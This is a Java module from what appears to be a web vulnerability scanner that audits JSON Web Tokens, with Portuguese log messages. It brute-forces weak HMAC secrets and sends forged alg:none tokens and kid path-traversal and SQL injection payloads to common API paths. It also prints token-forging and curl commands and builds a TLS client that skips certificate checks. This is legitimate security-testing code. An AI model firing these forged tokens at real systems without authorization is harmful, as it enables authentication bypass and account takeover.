package gg.effront.anarcry.scanner.crypto.jwt;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;
import gg.effront.anarcry.scanner.util.TlsUtil;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.function.Consumer;
import javax.net.ssl.SSLParameters;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class JwtModule implements Scanner {

    private static final List<String> WEAK_SECRETS = List.of("secret", "password", "123456", "admin", "test",
            "changeme", "your-256-bit-secret", "your-secret-key", "jwt_secret", "supersecret", "mysecret", "secretkey",
            "key", "private", "p@ssw0rd", "qwerty", "1234567890", "letmein", "token", "jwt", "app_secret", "hs256");

    @Override
    public String id() {
        return "JWT";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        List<Finding> findings = new ArrayList<>();

        String token = ctx.jwtToken();
        if (token == null || token.isBlank()) {
            log.accept("[~] JWT: nenhum token informado -- módulo ignorado");
            return findings;
        }

        log.accept("[~] JWT: analisando token");

        String[] parts = token.trim().split("\\.");
        if (parts.length < 2) {
            log.accept("[!] JWT: formato inválido (menos de 2 partes)");
            return findings;
        }

        String headerJson = decodeB64(parts[0]);
        String payloadJson = decodeB64(parts[1]);
        String evidence = "Header: " + headerJson + " | Payload: " + payloadJson;

        log.accept("[~] JWT: header=" + headerJson);
        log.accept("[~] JWT: payload=" + payloadJson);

        JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
        JsonObject payload = JsonParser.parseString(payloadJson).getAsJsonObject();

        String alg = header.has("alg") ? header.get("alg").getAsString() : "";

        String _cweId = CweRegistry.cweId("JWT");
        String _cweTitle = CweRegistry.cweTitle("JWT");
        String _cvssVector = CweRegistry.cvssVector("JWT");
        double _score = CvssCalculator.calculate(_cvssVector);

        // ── Análise local ──────────────────────────────────────────────────

        // 1. alg:none
        if (alg.equalsIgnoreCase("none") || alg.isBlank()) {
            log.accept("[!] JWT: alg:none detectado -- CRÍTICO");
            findings.add(Finding.of("JWT", "(token)", "JWT alg:none aceito", Severity.CRITICAL, evidence,
                    "Token sem assinatura -- qualquer payload pode ser aceito pelo servidor",
                    "echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64url + '.' + echo -n '{\"sub\":\"admin\"}' |"
                            + "base64url + '.'",
                    "Rejeitar tokens com alg:none na validação do servidor", _cweId, _cweTitle, _cvssVector, _score));
        }

        // 2. HS256 brute-force
        if (alg.equalsIgnoreCase("HS256") && parts.length == 3) {
            log.accept("[~] JWT: HS256 -- tentando brute-force de segredo fraco");
            String sigInput = parts[0] + "." + parts[1];
            byte[] actualSig = Base64.getUrlDecoder().decode(padB64(parts[2]));

            for (String secret : WEAK_SECRETS) {
                try {
                    Mac mac = Mac.getInstance("HmacSHA256");
                    mac.init(new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256"));
                    byte[] expected = mac.doFinal(sigInput.getBytes("UTF-8"));
                    if (Arrays.equals(expected, actualSig)) {
                        log.accept("[!] JWT: segredo fraco encontrado: '" + secret + "'");
                        findings.add(Finding.of("JWT", "(token)", "Segredo JWT fraco encontrado", Severity.CRITICAL,
                                "Segredo: '" + secret + "' | " + evidence,
                                "Com o segredo exposto, qualquer claim pode ser forjado e assinado",
                                "python3 -c \"import jwt; print(jwt.encode({'sub':'admin'}, '" + secret
                                        + "', algorithm='HS256'))\"",
                                "Trocar o segredo HMAC por um valor aleatório de 256+ bits", _cweId, _cweTitle,
                                _cvssVector, _score));
                        break;
                    }
                } catch (Exception ignored) {
                }
            }
        }

        // 3. Claim exp
        if (payload.has("exp")) {
            long exp = payload.get("exp").getAsLong();
            long now = System.currentTimeMillis() / 1000;
            if (exp < now) {
                log.accept("[!] JWT: token expirado (exp=" + exp + ")");
                findings.add(Finding.of("JWT", "(token)", "JWT expirado ainda aceito potencialmente", Severity.HIGH,
                        evidence + " | exp=" + exp + " (agora=" + now + ")",
                        "Token vencido sendo submetido -- verificar se o servidor valida o claim exp",
                        "Reenviar o token no header: Authorization: Bearer <token_expirado>",
                        "Garantir validação do claim exp na autenticação do servidor", _cweId, _cweTitle, _cvssVector,
                        _score));
            }
        } else {
            log.accept("[~] JWT: sem claim exp");
            findings.add(Finding.of("JWT", "(token)", "JWT sem claim exp (sem validade)", Severity.LOW, evidence,
                    "Tokens sem exp não expiram -- se comprometidos, permanecem válidos indefinidamente",
                    "Inspecionar o payload: echo '" + (parts.length > 1 ? parts[1] : "") + "' | base64 -d",
                    "Incluir claim exp com validade curta (ex: 15 minutos)", _cweId, _cweTitle, _cvssVector, _score));
        }

        // 4. kid (passivo)
        if (header.has("kid")) {
            String kid = header.get("kid").getAsString();
            log.accept("[!] JWT: parâmetro kid presente: " + kid);
            findings.add(Finding.of("JWT", "(token)", "Parâmetro kid presente -- testar injeção", Severity.LOW,
                    "kid=" + kid + " | " + evidence,
                    "Parâmetro kid sem sanitização pode causar path traversal ou injeção SQL",
                    "Forjar token com kid: ../../dev/null (key=vazio) ou kid: ' UNION SELECT 'secret'--",
                    "Validar e sanitizar o parâmetro kid; usar whitelist de IDs válidos", _cweId, _cweTitle,
                    _cvssVector, _score));
        }

        // 5. RS256 informativo
        if (alg.equalsIgnoreCase("RS256")) {
            log.accept("[~] JWT: RS256 detectado");
            findings.add(Finding.of("JWT", "(token)", "RS256 detectado -- testar confusão RS256→HS256", Severity.INFO,
                    evidence,
                    "Se o servidor aceitar HS256 com a chave pública como segredo, a assinatura pode ser forjada",
                    "Obter chave pública e recriar token HS256 usando-a como segredo HMAC",
                    "Substituir alg:RS256 por alg:HS256 e assinar com a chave pública do servidor", _cweId, _cweTitle,
                    _cvssVector, _score));
        }

        // 6. jku (passivo -- novo)
        new JkuHeaderAnalyzer().analyze(header, evidence).ifPresent(findings::add);

        // ── Probes ativas de rede ──────────────────────────────────────────
        if (parts.length >= 2 && !alg.equalsIgnoreCase("none")) {
            String scheme2 = ctx.isHttps() ? "https" : "http";
            String base = scheme2 + "://" + ctx.host()
                    + (ctx.port() != (ctx.isHttps() ? 443 : 80) ? ":" + ctx.port() : "");
            try {
                HttpClient hc = HttpClientFactory.noRedirect();

                // Probe A: alg:none ativo (existente)
                String noneHdr = Base64.getUrlEncoder().withoutPadding()
                        .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes());
                String noneToken = noneHdr + "." + parts[1] + ".";
                log.accept("[~] JWT: probe ativa alg:none → " + base);
                outer1 : for (String path : List.of("/api/me", "/api/user", "/api/profile")) {
                    try {
                        HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
                                .header("Authorization", "Bearer " + noneToken).timeout(Duration.ofSeconds(5)).GET()
                                .build();
                        HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), id());
                        log.accept("[~] JWT: probe alg:none " + path + " → HTTP " + resp.statusCode());
                        if (resp.statusCode() == 200) {
                            log.accept("[!] JWT: alg:none aceito ativamente em " + base + path);
                            findings.add(Finding.of("JWT", base + path, "JWT alg:none aceito ativamente",
                                    Severity.CRITICAL,
                                    "Probe em " + base + path + " → HTTP 200 com alg:none | " + evidence,
                                    "Servidor aceita tokens sem assinatura -- qualquer payload pode ser forjado",
                                    "curl -H 'Authorization: Bearer " + noneToken + "' " + base + path,
                                    "Rejeitar tokens com alg:none na camada de validação do servidor", _cweId,
                                    _cweTitle, _cvssVector, _score));
                            break outer1;
                        }
                    } catch (Exception ex) {
                        log.accept("[~] JWT: probe alg:none " + path + " -- " + ex.getMessage());
                    }
                }

                // Probe B: kid injection ativo (existente)
                if (header.has("kid")) {
                    log.accept("[~] JWT: probe ativa kid injection → " + base);
                    List<String> kidPayloads = List.of("../../dev/null", "' OR '1'='1", "0 UNION SELECT 'x'--");
                    outer2 : for (String kidVal : kidPayloads) {
                        String injHdr = Base64.getUrlEncoder().withoutPadding().encodeToString(
                                ("{\"alg\":\"none\",\"typ\":\"JWT\",\"kid\":\"" + kidVal + "\"}").getBytes());
                        String injToken = injHdr + "." + parts[1] + ".";
                        for (String path : List.of("/api/me", "/api/user", "/api/profile")) {
                            try {
                                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
                                        .header("Authorization", "Bearer " + injToken).timeout(Duration.ofSeconds(5))
                                        .GET().build();
                                HttpResponse<Void> resp = Http.send(ctx, hc, req,
                                        HttpResponse.BodyHandlers.discarding(), id());
                                if (resp.statusCode() == 200) {
                                    log.accept("[!] JWT: kid injection aceito: " + kidVal);
                                    findings.add(Finding.of("JWT", base + path, "kid injection aceito ativamente",
                                            Severity.HIGH,
                                            "kid='" + kidVal + "' em " + base + path + " → HTTP 200 | " + evidence,
                                            "kid sem sanitização pode permitir path traversal ou SQLi no carregamento"
                                                    + " de chave",
                                            "curl -H 'Authorization: Bearer " + injToken + "' " + base + path,
                                            "Validar e sanitizar kid; usar whitelist de IDs de chaves válidos", _cweId,
                                            _cweTitle, _cvssVector, _score));
                                    break outer2;
                                }
                            } catch (Exception ex) {
                                log.accept("[~] JWT: probe kid " + path + " -- " + ex.getMessage());
                            }
                        }
                    }
                }

                // Probe C: Null signature (novo -- CVE-2020-28042)
                new NullSignatureProbe().probe(parts, ctx, base, hc, log).ifPresent(findings::add);

                // Probe D: Signature disclosure (novo -- CVE-2019-7644)
                new SignatureDisclosureProbe().probe(parts, ctx, base, hc, log).ifPresent(findings::add);

                // Probe E: RS256→HS256 confusion + JWK injection (novo -- apenas RS256)
                if (alg.equalsIgnoreCase("RS256")) {
                    new Rs256Hs256Probe().probe(parts, ctx, base, hc, log).ifPresent(findings::add);
                    new JwkInjectionProbe().probe(parts, ctx, base, hc, log).ifPresent(findings::add);
                }

            } catch (Exception ex) {
                log.accept("[~] JWT: probes ativas indisponíveis: " + ex.getMessage());
            }
        }

        return findings;
    }

    private String decodeB64(String input) {
        try {
            return new String(Base64.getUrlDecoder().decode(padB64(input)));
        } catch (Exception e) {
            return "{}";
        }
    }

    private String padB64(String input) {
        int mod = input.length() % 4;
        return mod == 0 ? input : input + "=".repeat(4 - mod);
    }

    private HttpClient buildTrustAllClient() throws Exception {
        // Disable both cert chain validation (trustAll) and hostname verification
        // -- necessary for probing servers with self-signed or IP-addressed certs
        SSLParameters params = new SSLParameters();
        params.setEndpointIdentificationAlgorithm("");
        return HttpClient.newBuilder().sslContext(TlsUtil.sslContext(TlsUtil.trustAll())).sslParameters(params)
                .version(HttpClient.Version.HTTP_1_1).connectTimeout(Duration.ofSeconds(5)).build();
    }
}
